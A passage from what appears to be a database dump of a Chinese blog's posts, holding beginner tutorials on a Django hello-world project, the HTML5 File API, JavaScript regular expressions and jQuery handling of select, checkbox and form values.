&nbsp;Django是一个开放源代码的Web应用框架，由Python写成。采用了MVC的软件设计模式，即模型M，视图V和控制器C。它最初是被开发来用于管理劳伦斯出版集团旗下的一些以新闻内容为主的网站的，即是CMS（内容管理系统）软件。并于2005年7月在BSD许可证下发布。这套框架是以比利时的吉普赛爵士吉他手Django Reinhardt来命名的。</span></p>\r\n\r\n<p><strong>学习条件：</strong></p>\r\n\r\n<p>1、确定python安装成功（下载地址：https://www.python.org/downloads/ 请选择2.X版本）</p>\r\n\r\n<p>2、确定安装pip工具(https://pypi.python.org/pypi/pip)</p>\r\n\r\n<p>3、eclipse安装pydev工具（插件地址：<span style=\"color:rgb(0, 0, 0); font-family:open sans,helvetica,arial,sans-serif; font-size:14px\">http://pydev.org/updates</span>）</p>\r\n\r\n<p><strong>命令执行：</strong></p>\r\n\r\n<p>pip install django</p>\r\n\r\n<p>这样相关的django就会安装成功</p>\r\n\r\n<p><strong>第一个helloworld</strong></p>\r\n\r\n<p>1、打开eclipse，新建项目选择pydev&gt;pydev django project</p>\r\n\r\n<p>2、选下一步，输入项目名称</p>\r\n\r\n<p>3、django设置，输入相关的数据库设置。建议使用mysql，需要先在mysql创建对应的数据库</p>\r\n\r\n<p>4、新建一个view.py文件，内容如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-python\">\'\'\'\r\n@author: ligson\r\n\'\'\'\r\nfrom django.http.response import HttpResponse\r\ndef hello(req):\r\n    return HttpResponse(\"&lt;h1&gt;hello world&lt;/h1&gt;\")\r\n</code></pre>\r\n\r\n<p><span style=\"color:#FF0000\">注意eclipse自动生成有中文，先删除了，以后再想怎么办</span></p>\r\n\r\n<p>5、urls.py内容如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-python\">\"\"\"pydemo1 URL Configuration\r\n\r\nThe `urlpatterns` list routes URLs to views. For more information please see:\r\n    https://docs.djangoproject.com/en/1.8/topics/http/urls/\r\nExamples:\r\nFunction views\r\n    1. Add an import:  from my_app import views\r\n    2. Add a URL to urlpatterns:  url(r\'^$\', views.home, name=\'home\')\r\nClass-based views\r\n    1. Add an import:  from other_app.views import Home\r\n    2. Add a URL to urlpatterns:  url(r\'^$\', Home.as_view(), name=\'home\')\r\nIncluding another URLconf\r\n    1. Add an import:  from blog import urls as blog_urls\r\n    2. Add a URL to urlpatterns:  url(r\'^blog/\', include(blog_urls))\r\n\"\"\"\r\nfrom django.conf.urls import include, url\r\nfrom django.contrib import admin\r\nfrom pydemo1.view import hello\r\n\r\nurlpatterns = [\r\n    url(r\'^admin/\', include(admin.site.urls)),\r\n    url(r\'^hello/$\', hello),\r\n]\r\n</code></pre>\r\n\r\n<p>6、在命令窗口的项目目录下执行如下命令:</p>\r\n\r\n<p>python manage.py migrate</p>\r\n\r\n<p>7、eclipse在项目名字上右键&gt;Run as&gt;PyDev:Django</p>\r\n\r\n<p>8、浏览器输入地址：http://127.0.0.1:8000/hello/</p>\r\n\r\n<p>ok已经可以访问了。</p>\r\n',0,0,'Django系列教程-1-入门',103,NULL,0),(58,0,'20150712130746',2,'<p><span style=\"font-family:helvetica neue,helvetica,arial,sans-serif; font-size:14px\">&nbsp; &nbsp; &nbsp; 在之前我们操作本地文件都是使用flash、silverlight或者第三方的activeX插件等技术，由于使用了这些技术后就很难进行跨平台、或者跨浏览器、跨设备等情况下实现统一的表现，从另外一个角度来说就是让我们的web应用依赖了第三方的插件，而不是很独立，不够通用。在HTML5标准中，默认提供了操作文件的API让这一切直接标准化。有了操作文件的API，让我们的Web应用可以很轻松的通过JS来控制文件的读取、写入、文件夹、文件等一系列的操作，让Web应用不再那么蹩脚，而之前Web应用如果不借助第三方插件，那就是个shit！但是最新的标准中大部分浏览器都已经实现了文件的读取API，文件的写入，文件和文件夹的最新的标准刚制定完毕，相信后面随着浏览器的升级这些功能肯定会实现的非常好，接下来我主要给大家介绍文件读取的几个API。</span></p>\r\n\r\n<p><strong>1):FileList对象</strong><br />\r\n<span style=\"font-family:helvetica neue,helvetica,arial,sans-serif; font-size:14px\">&nbsp; 它是File对象的一个集合，在Html4标准中文件上传控件只接受一个文件，而在新标准中，只需要设置multiple，就支持多文件上传，所以从此标签中获取的files属性就是FileList对象实例。demo：&lt;input type=&quot;file&quot; multiple=&quot;multiple&quot; name=&quot;fileDemo&quot; id=&quot;fileDemo&quot; /&gt; &nbsp;；下面是关于FileList对象的API的原型： &nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">interface FileList {\r\n      getter File? item(unsigned long index);\r\n      readonly attribute unsigned long length;\r\n};</code></pre>\r\n\r\n<p><strong>2)Blob对象</strong></p>\r\n\r\n<p><span style=\"font-family:helvetica neue,helvetica,arial,sans-serif; font-size:14px\">其实就是一个原始数据对象，它提供了slice方法可以读取原始数据中的某块数据。另外有两个属性：size（数据的大小），type（数据的MIME类型）；看下面的是W3C的API原型：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\"> interface Blob {\r\n      \r\n      readonly attribute unsigned long long size;\r\n      readonly attribute DOMString type;\r\n      \r\n      //slice Blob into byte-ranged chunks     \r\n      Blob slice(optional long long start,\r\n                 optional long long end,\r\n                 optional DOMString contentType); \r\n    \r\n    };</code></pre>\r\n\r\n<p><strong>3）File对象</strong><br />\r\n<span style=\"font-family:helvetica neue,helvetica,arial,sans-serif; font-size:14px\">继承自Blob对象，指向一个具体的文件，它还有两个属性：name（文件名), lastModifiedDate（最后修改时间)；然后让我们看一些W3C的标准：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">interface File : Blob {\r\n\r\n          readonly attribute DOMString name;\r\n          readonly attribute Date lastModifiedDate;\r\n };</code></pre>\r\n\r\n<p><strong>4）FileReader对象</strong><br />\r\n<span style=\"font-family:helvetica neue,helvetica,arial,sans-serif; font-size:14px\">设计用来读取文件里面的数据，提供三个常用的读取文件数据的方法，另外读取文件数据使用了异步的方式，非常高效。然后让我们看一些W3C的标准：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">[Constructor]\r\n    interface FileReader: EventTarget {\r\n\r\n      // async read methods\r\n      void readAsArrayBuffer(Blob blob);\r\n      void readAsBinaryString(Blob blob);\r\n      void readAsText(Blob blob, optional DOMString encoding);\r\n      void readAsDataURL(Blob blob);\r\n\r\n      void abort();\r\n\r\n      // states  \r\n      const unsigned short EMPTY = 0;\r\n      const unsigned short LOADING = 1;\r\n      const unsigned short DONE = 2;\r\n\r\n\r\n      readonly attribute unsigned short readyState;\r\n\r\n      // File or Blob data\r\n      readonly attribute any result;\r\n\r\n      readonly attribute DOMError error;\r\n\r\n      // event handler attributes\r\n      attribute [TreatNonCallableAsNull] Function? onloadstart;\r\n      attribute [TreatNonCallableAsNull] Function? onprogress;\r\n      attribute [TreatNonCallableAsNull] Function? onload;\r\n      attribute [TreatNonCallableAsNull] Function? onabort;\r\n      attribute [TreatNonCallableAsNull] Function? onerror;\r\n      attribute [TreatNonCallableAsNull] Function? onloadend;\r\n\r\n    };</code></pre>\r\n\r\n<p>这个对象是非常重要第一个对象，它提供了四个读取文件数据的方法，这些方法都是异步的方式读取数据，读取成功后就直接将结果放到属性result中。所以一般就是直接读取数据，然后监听此对象的onload事件，然后在事件里面读取result属性，再做后续处理。当然<span style=\"color:rgb(0, 0, 0)\">abort</span>就是停止读取的方法。其他的就是事件和状态不再赘述。</p>\r\n\r\n<p><strong>三个方法都介绍一下：</strong></p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0)\"><strong>readAsBinaryString(Blob blob);</strong>&nbsp;&nbsp;&rarr;&nbsp;传入一个Blob对象，然后读取数据的结果作为二进制字符串的形式放到FileReader的result属性中。</span></p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0)\"><strong>readAsText(Blob blob, optional DOMString encoding);</strong>&rarr;第一个参数传入Blog对象，然后第二个参数传入编码格式，异步将数据读取成功后放到result属性中，读取的内容是普通的文本字符串的形式。</span></p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0)\"><strong>readAsDataURL(Blob blob);</strong>&rarr;传入一个Blob对象，读取内容可以做为URL属性，也就是说可以将一个图片的结果指向给一个img的src属性。 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>\r\n\r\n<p>读取文件上传控件里的文件并将内容已不同的方式展现到浏览器里面实例</p>\r\n\r\n<p>　　在展示代码之前，之前我们操作一个图片文件，都是先将图片上传到服务器端，然后再使用一个img标签指向到服务器的url地址，然后再进行一个使用第三方插件进行图片处理，而现在这一切都不需要服务器端了，因为FileReader对象提供的几个读取文件的方法变得异常简单，而且全不是客户端js的操作。且看下面的demo：</p>\r\n\r\n<p>案例一：获取上传文件的文件名(在线演示地址)</p>\r\n\r\n<pre>\r\n<code class=\"language-html\">\r\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\r\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\r\n&lt;head&gt;\r\n    &lt;title&gt;&lt;/title&gt;\r\n    &lt;script src=\"Scripts/jquery-1.5.1.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\r\n    &lt;script type=\"text/javascript\"&gt;\r\n        $(function () {\r\n            $(\"#btnGetFile\").click(function (e) {\r\n                var fileList = document.getElementById(\"fileDemo\").files;\r\n                for (var i = 0; i &lt; fileList.length; i++) {\r\n                    if (!(/image\\/\\w+/.test(fileList[i].type))) {\r\n                         $(\"#result\").append(\"&lt;span&gt;type:\"+fileList[i].type+\"--******非图片类型*****--name:\"+fileList[i].name+\"--size:\"+fileList[i].size+\"&lt;/span&gt;&lt;br /&gt;\");\r\n                    }\r\n                    else {\r\n                        $(\"#result\").append(\"&lt;span&gt;type:\"+fileList[i].type+\"--name:\"+fileList[i].name+\"--size:\"+fileList[i].size+\"&lt;/span&gt;&lt;br /&gt;\");\r\n                    }\r\n                }\r\n            });\r\n        });\r\n \r\n    &lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n    &lt;form action=\"/home/index\" method=\"POST\" novalidate=\"true\"&gt;\r\n        &lt;input type=\"file\" multiple=\"multiple\" name=\"fileDemo\" id=\"fileDemo\" /&gt;&lt;br/&gt;\r\n        &lt;input type=\"button\" value=\"获取文件的名字\" id=\"btnGetFile\"/&gt;\r\n        &lt;div id=\"result\"&gt;&lt;/div&gt;\r\n    &lt;/form&gt;\r\n    &lt;hr/&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;</code></pre>\r\n\r\n<p><span style=\"font-family:helvetica neue,helvetica,arial,sans-serif; font-size:14px\">案例二：读取上传文件内容，然后将文件内容直接读取到浏览器上</span>(在线演示地址)</p>\r\n\r\n<pre>\r\n<code class=\"language-html\">&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\r\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\r\n&lt;head&gt;\r\n    &lt;title&gt;&lt;/title&gt;\r\n    &lt;script src=\"Scripts/jquery-1.5.1.js\" type=\"text/javascript\"&gt;&lt;/script&gt;  \r\n    &lt;script type=\"text/javascript\"&gt;\r\n         \r\n        if(typeof FileReader == \"undified\") {\r\n            alert(\"您老的浏览器不行了！\");\r\n        }\r\n \r\n        function showDataByURL() {\r\n            var resultFile = document.getElementById(\"fileDemo\").files[0];\r\n            if (resultFile) {\r\n                var reader = new FileReader();\r\n                 \r\n                reader.readAsDataURL(resultFile);\r\n                reader.onload = function (e) {\r\n                    var urlData = this.result;\r\n                    document.getElementById(\"result\").innerHTML += \"&lt;img src=\'\" + urlData + \"\' alt=\'\" + resultFile.name + \"\' /&gt;\";\r\n                }; \r\n                \r\n            }\r\n             \r\n        } \r\n \r\n        function showDataByBinaryString() {\r\n              var resultFile = document.getElementById(\"fileDemo\").files[0];\r\n            if (resultFile) {\r\n                var reader = new FileReader();\r\n                //异步方式，不会影响主线程\r\n                reader.readAsBinaryString(resultFile);\r\n                 \r\n                reader.onload = function(e) {\r\n                    var urlData = this.result;\r\n                    document.getElementById(\"result\").innerHTML += urlData;\r\n                };\r\n            }\r\n        }\r\n \r\n \r\n        function showDataByText() {\r\n            var resultFile = document.getElementById(\"fileDemo\").files[0];\r\n            if (resultFile) {\r\n                var reader = new FileReader();\r\n \r\n                reader.readAsText(resultFile,\'gb2312\');\r\n                reader.onload = function (e) {\r\n                    var urlData = this.result;\r\n                    document.getElementById(\"result\").innerHTML += urlData;\r\n                };\r\n            }\r\n        }\r\n         \r\n    &lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n    &lt;input type=\"file\" name=\"fileDemo\" id=\"fileDemo\" multep/&gt;\r\n    &lt;input type=\"button\" value=\"readAsDataURL\" id=\"readAsDataURL\" onclick=\"showDataByURL();\"/&gt;\r\n    &lt;input type=\"button\" value=\"readAsBinaryString\"  id=\"readAsBinaryString\" onclick=\"showDataByBinaryString();\"/&gt;\r\n    &lt;input type=\"button\" value=\"readAsText\"  id=\"readAsText\" onclick=\"showDataByText();\"/&gt;\r\n    &lt;div id=\"result\"&gt;\r\n         \r\n    &lt;/div&gt;\r\n \r\n&lt;/body&gt;\r\n&lt;/html&gt;</code></pre>\r\n\r\n<p><strong>总结</strong></p>\r\n\r\n<p>有了文件操作的API后，让JS进一步的操作本地文件的得到空前的加强，HTML5对于客户端Web应用得到进一步功能的提升，HTML5的趋势让Web更加富客户端化，而这些都需要让我们的HTML或者JS变得更加强大，而HTML5正是适时地推出了File API!</p>\r\n',0,0,'html5文件操作API',50,NULL,0),(59,0,'20150712131601',2,'<p><strong>js中的正则表达式比起C#中的正则表达式要弱很多，但基本够用了</strong><br />\r\n1定义正则表达式<br />\r\n2关于验证的三个这则表达式方法<br />\r\n3正则表达式式的转义字符<br />\r\n<br />\r\n<strong>1定义正则表达式</strong><br />\r\n在js中定义正则表达式很简单，有两种方式，一种是通过构造函数，一种是通过//，也就是两个斜杠。<br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">  var   re =new RegExp(\"\\\\?(\\\\w{1,}=\\\\w{1,}&amp;){1,}\\\\w{1,}=\\\\w{1,}\");\r\n</code></pre>\r\n\r\n<p>使用构造函数定义正则表达式，注意大小写，负责就会不起作用。由于构造函数的参数是一个字符串，也可以是两个斜杠的方式定义，遇到一些特殊字符就需要使用\\进行转义<br />\r\n通过双斜杠的方式定义同样的正则表达式<br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">var   re =/\\?(\\w{1,}=\\w{1,}&amp;){1,}\\w{1,}=\\w{1,}/;\r\nvar re =new RegExp( /^\\?(\\w{1,}=\\w{1,}&amp;){1,}\\w{1,}=\\w{1,}/);\r\n</code></pre>\r\n\r\n<p>可以和构造函数达到同样的效果，但仔细分析，发现，通过构造函数需要更多的转义字符\\<br />\r\n<br />\r\n<strong>2关于验证的三个正则表达式方法</strong><br />\r\n使用正则表达式的主要有字符串的方法match，正则表达式的方法exec，test<br />\r\n正则表达式方法test测试给定的字符串是否满足正则表达式，返回值是bool类型的，只有真和假，如果只是单纯的判断，不需要其他的处理，可以使用尤其是验证时。<br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">function test(){ \r\n    var text=\"index.aspx?test=1&amp;ww=2&amp;www=3\"; //    \r\n      var   re =/\\?(\\w{1,}=\\w{1,}&amp;){1,}\\w{1,}=\\w{1,}/;\r\n    //  var   re =new RegExp(\"\\\\?(\\\\w{1,}=\\\\w{1,}&amp;){1,}\\\\w{1,}=\\\\w{1,}\");\r\n        var result=  re.test(text);\r\n     if(result)\r\n     {\r\n        alert(\"ok\");   \r\n     }else\r\n     {\r\n      alert(\"err\");  \r\n     }                 \r\n\r\n      }\r\n</code></pre>\r\n\r\n<p>正则表达式方法exec测试给定的字符串是否满足正则表达式，返回匹配到的字符串，如果没有匹配的则返回null，和test基本一致，如果需要获取匹配的各个子字符串，可以使用下标的方式，把上边的test的例子可以改写如下<br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">function test(){ \r\n   var text=\"index.aspx?test=1&amp;ww=2&amp;www=3\";\r\n            var   re = /\\?(\\w{1,}=\\w{1,}&amp;){1,}\\w{1,}=\\w{1,}/;\r\n   //  var   re =new RegExp( \"\\\\?(\\\\w{1,}=\\\\w{1,}&amp;){1,}\\\\w{1,}=\\\\w{1,}\");\r\n        var result=  re.exec(text); \r\n      if(result)\r\n     {\r\n           alert(\"ok\"); \r\n                          alert(result);  // 是?test=1&amp;ww=2&amp;www=3,ww=2&amp;     \r\n            alert(result[0]+\",0\");//是?test=1&amp;ww=2&amp;www=3\r\n     alert(result[1]+\",1\");//是ww=2&amp;     \r\n     }else\r\n     {\r\n      alert(\"err\");  \r\n     }   \r\n\r\n      }\r\n</code></pre>\r\n\r\n<p>match其实是字符串的方法，但参数确是一个正则表达式，把上边的例子改写后，如下<br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">function test(){ \r\n    var text=\"index.aspx?test=1&amp;ww=234\"; //\r\n          var   re = /\\?(\\w{1,}=\\w{1,}&amp;){1,}\\w{1,}=\\w{1,}/;\r\n     //   var   re2 = \"(\\\\w{1,}=\\\\w{1,}&amp;){1,}\\\\w{1,}=\\\\w{1,}\"\r\n     var result= text.match(re);\r\n       if(result)\r\n         {\r\n                           alert(result);//?test=1&amp;ww=234,test=1&amp;        \r\n              alert(result[0]+\",0\");//?test=1&amp;ww=234\r\n        alert(result[1]+\",1\");//test=1&amp;\r\n   }else\r\n          {\r\n          alert(\"err\");  \r\n         }  \r\n      }\r\n</code></pre>\r\n\r\n<p>其实字符串类还有多个函数可以传递正则表达式，split，search，replace等但这些方法已经不适合验证了。</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">function test(){ \r\n    var text=\"index.aspx?test=1&amp;ww=234\"; //\r\n          var   re = /\\?(\\w{1,}=\\w{1,}&amp;){1,}\\w{1,}=\\w{1,}/;\r\n     //   var   re2 = \"(\\\\w{1,}=\\\\w{1,}&amp;){1,}\\\\w{1,}=\\\\w{1,}\"\r\n     var result= text.split(re);     \r\n                  alert(result);        \r\n           alert(result[0]+\",0\");\r\n        alert(result[1]+\",1\");    \r\n      }\r\n</code></pre>\r\n\r\n<p><strong>3正则表达式式的转义字符</strong><br />\r\n在正则表达式中会经常出现转义字符，例如问号?在正则表达式中有特殊的含义，如果需要匹配问号?就需要转义，使用转义字符反斜杠\\<br />\r\n如下两个都是匹配问号开头的一段字符串<br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\"> function test(){ \r\n   var text=\"?test=1&amp;ww=2&amp;www=3\";\r\n           var   re = /^\\?(\\w{1,}=\\w{1,}&amp;){1,}\\w{1,}=\\w{1,}/;//  \\?表示配置问号?\r\n   //  var   re =new RegExp( \"^\\\\?(\\\\w{1,}=\\\\w{1,}&amp;){1,}\\\\w{1,}=\\\\w{1,}\");//  \\\\?表示配置问号?\r\n        var result=  re.exec(text); \r\n      if(result)\r\n     {\r\n           alert(\"ok\"); \r\n                 alert(result);        \r\n           alert(result[0]+\",0\");\r\n        alert(result[1]+\",1\");     \r\n     }else\r\n     {\r\n      alert(\"err\");  \r\n     }   \r\n\r\n      }\r\n</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'js正则表达式的使用详解',49,NULL,0),(60,0,'20150712132637',2,'<p>每一次操作select的时候，总是要出来翻一下资料，不如自己总结一下，以后就翻这里了。</p>\r\n\r\n<p>比如&lt;select class=&quot;selector&quot;&gt;&lt;/select&gt;</p>\r\n\r\n<p>1、设置value为pxx的项选中&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\".selector\").val(\"pxx\");</code></pre>\r\n\r\n<p>2、设置text为pxx的项选中</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\"> $(\".selector\").find(\"option[text=\'pxx\']\").attr(\"selected\",true);</code></pre>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 这里有一个中括号的用法，中括号里的等号的前面是属性名称，不用加引号。很多时候，中括号的运用可以使得逻辑变得很简单。</p>\r\n\r\n<p>3、获取当前选中项的value</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\".selector\").val();</code></pre>\r\n\r\n<p>4、获取当前选中项的text</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\".selector\").find(\"option:selected\").text();</code></pre>\r\n\r\n<p>&nbsp;&nbsp;这里用到了冒号，掌握它的用法并举一反三也会让代码变得简洁。</p>\r\n\r\n<p>很多时候用到select的级联，即第二个select的值随着第一个select选中的值变化。这在jquery中是非常简单的。</p>\r\n\r\n<p>如：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\".selector1\").change(function(){\r\n\r\n     // 先清空第二个\r\n\r\n      $(\".selector2\").empty();\r\n\r\n     // 实际的应用中，这里的option一般都是用循环生成多个了\r\n\r\n      var option = $(\"&lt;option&gt;\").val(1).text(\"pxx\");\r\n\r\n      $(\".selector2\").append(option);\r\n\r\n});</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,' jquery操作select(取值，设置选中）',53,NULL,0),(61,0,'20150712133816',2,'<p>一、通过选择器选取CheckBox:</p>\r\n\r\n<p>&nbsp; 1.给CheckBox设置一个id属性，通过id选择器选取：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">&lt;input type=\"checkbox\" name=\"myBox\" id=\"chkOne\" value=\"1\" checked=\"checked\" /&gt;</code></pre>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; JQuery:</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\"#chkOne\").click(function(){});</code></pre>\r\n\r\n<p>&nbsp; &nbsp;2.给CheckBox设置一个class属性，通过类选择器选取：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">&lt;input type=\"checkbox\" name=\"myBox\" class=\"chkTwo\" value=\"1\" checked=\"checked\" /&gt;</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; JQuery:<code>&nbsp; &nbsp; &nbsp;</code></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\".chkTwo\").click(function(){});</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><code>&nbsp; 3.通过标签选择器和属性选择器来选取：</code></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">&lt;input type=\"checkbox\" name=\"someBox\"  value=\"1\" checked=\"checked\" /&gt;\r\n&lt;input type=\"checkbox\" name=\"someBox\" value=\"2\" /&gt;</code></pre>\r\n\r\n<p><code>&nbsp;&nbsp; JQuery: </code><code> </code></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\"input[name=\'someBox\']\").click(function(){});</code></pre>\r\n\r\n<p><code>二、对CheckBox的操作：</code></p>\r\n\r\n<p><code>&nbsp;&nbsp; 以这段checkBox代码为例：</code></p>\r\n\r\n<pre>\r\n<code class=\"language-html\">   &lt;input type=\"checkbox\" name=\"box\"  value=\"0\" checked=\"checked\" /&gt;\r\n   &lt;input type=\"checkbox\" name=\"box\" value=\"1\" /&gt;\r\n   &lt;input type=\"checkbox\" name=\"box\" value=\"2\" /&gt;\r\n   &lt;input type=\"checkbox\" name=\"box\" value=\"3\" /&gt;</code></pre>\r\n\r\n<p><code>&nbsp;&nbsp; 1.遍历checkbox用each()方法：</code></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\"input[name=\'box\']\").each(function(){});</code></pre>\r\n\r\n<p><code>&nbsp;&nbsp; 2.设置checkbox被选中用attr();方法：</code></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\"input[name=\'box\']\").attr(\"checked\",\"checked\");</code></pre>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 在HTML中，如果一个复选框被选中，对应的标记为 checked=&quot;checked&quot;。 但如果用jquery alert($(&quot;#id&quot;).attr(&quot;checked&quot;)) 则会提示您是&quot;true&quot;而不是&quot;checked&quot;，所以判断 if(&quot;checked&quot;==$(&quot;#id&quot;).attr(&quot;checked&quot;)) 是错误的，应该是 if(true == $(&quot;#id&quot;).attr(&quot;checked&quot;))</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp; 3.获取被选中的checkbox的值：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\"input[name=\'box\'][checked]\").each(function(){\r\n    if (true == $(this).attr(\"checked\")) {\r\n          alert( $(this).attr(\'value\') );\r\n    }</code></pre>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 或者：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\"input[name=\'box\']：checked\").each(function(){\r\n    if (true == $(this).attr(\"checked\")) {\r\n          alert( $(this).attr(\'value\') );\r\n    }</code></pre>\r\n\r\n<p><br />\r\n&nbsp;&nbsp; $(&quot;input[name=&#39;box&#39;]：checked&quot;)与 $(&quot;input[name=&#39;box&#39;]&quot;)有何区别没试过，我试了用&nbsp;$(&quot;input[name=&#39;box&#39;]&quot;)能成功。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;4.获取未选中的checkbox的值：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(\"input[name=\'box\']\").each(function(){\r\n          if ($(this).attr(\'checked\') ==false) {\r\n                alert($(this).val());\r\n            }\r\n     });</code></pre>\r\n\r\n<p>&nbsp;&nbsp; 5.设置checkbox的value属性的值:</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">$(this).attr(\"value\",值);</code></pre>\r\n\r\n<p>三、&nbsp;一般都是创建一个js数组来存储遍历checkbox得到的值，创建js数组的方法：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.&nbsp;<span style=\"font-size:x-small\">&nbsp;</span><span style=\"font-size:small\">var array= new Array();</span></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.&nbsp;往数组添加数据：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array.push<span style=\"font-size:x-small\">($(this).val());</span><br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; 3.数组以&ldquo;,&rdquo;分隔输出：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert(array.join(&#39;,&#39;));</p>\r\n\r\n<pre>\r\n<code class=\"language-html\">&lt;input type=\"checkbox\" name=\"myBox\" class=\"chkTwo\" value=\"2\" /&gt;\r\n&lt;input type=\"checkbox\" name=\"myBox\" id=\"chkOne\" value=\"2\" /&gt;</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'jQuery操作CheckBox的方法介绍(选中,取消,取值)',51,NULL,0),(62,0,'20150712134728',2,'<p style=\"text-align:justify\"><span style=\"color:rgb(0, 0, 0); font-family:verdana; font-size:13px\">jquery取得text,areatext,radio,checkbox,select的值,以及其他一些操作;&nbsp;<br />\r\n1.假如我们有如下页面&nbsp;</span></p>\r\n\r\n<p style=\"text-align:justify\">&lt;input&nbsp;type=&quot;text&quot;&nbsp;name=&quot;textname&quot;&nbsp;id=&quot;text_id&quot;&nbsp;value=&quot;&quot;&gt;&nbsp;&nbsp;<br />\r\n&lt;!&ndash;其余的请自行添加.重要的是要有TYPE.NAME.ID等,一般情况这些都是有的&ndash;&gt;&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">2.下面来看怎么取得FORM中的各种值等等;&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">function&nbsp;get_form_value(){&nbsp;&nbsp;<br />\r\n/*获得TEXT.AREATEXT的值*/&nbsp;&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;textval&nbsp;=&nbsp;$(&quot;#text_id&quot;).attr(&quot;value&quot;);//或者&nbsp;&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;textval&nbsp;=&nbsp;$(&quot;#text_id&quot;).val();&nbsp;&nbsp;<br />\r\n/*获取单选按钮的值*/&nbsp;&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;valradio&nbsp;=&nbsp;$(&quot;input[@type=radio][@checked]&quot;).val();&nbsp;&nbsp;<br />\r\n/*获取复选框的值*/&nbsp;&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;checkboxval&nbsp;=&nbsp;$(&quot;#checkbox_id&quot;).attr(&quot;value&quot;)；&nbsp;&nbsp;<br />\r\n/*获取下拉列表的值*/&nbsp;&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;selectval&nbsp;=&nbsp;$(&#39;#select_id&#39;).val();&nbsp;&nbsp;<br />\r\n}&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">3.另外对表单的其他处理:&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">//控制表单元素：&nbsp;&nbsp;<br />\r\n//文本框，文本区域：&nbsp;&nbsp;<br />\r\n$(&quot;#text_id&quot;).attr(&quot;value&quot;,&#39;&#39;);//清空内容&nbsp;&nbsp;<br />\r\n$(&quot;#text_id&quot;).attr(&quot;value&quot;,&#39;test&#39;);//填充内容&nbsp;&nbsp;<br 